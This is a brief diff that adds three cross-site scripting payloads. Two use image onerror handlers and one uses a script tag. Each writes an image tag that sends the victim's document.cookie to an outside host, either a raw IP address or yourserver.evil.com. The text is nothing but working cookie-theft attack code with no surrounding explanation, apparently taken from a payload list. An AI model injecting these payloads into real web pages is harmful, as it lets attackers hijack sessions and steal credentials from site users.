@@ -1,0 +1,5 @@
+<img src="x" onerror=document.write('<img src=http://198.211.119.82/' + document.cookie + ' />');/>
+
+<script> document.write('<img src="http://198.211.119.82:1235?cookie=' + document.cookie + '" />') </script>
+
+<img src="x" onerror=document.write('<img src="https://yourserver.evil.com/collect.gif?cookie=' + document.cookie + '" />') />
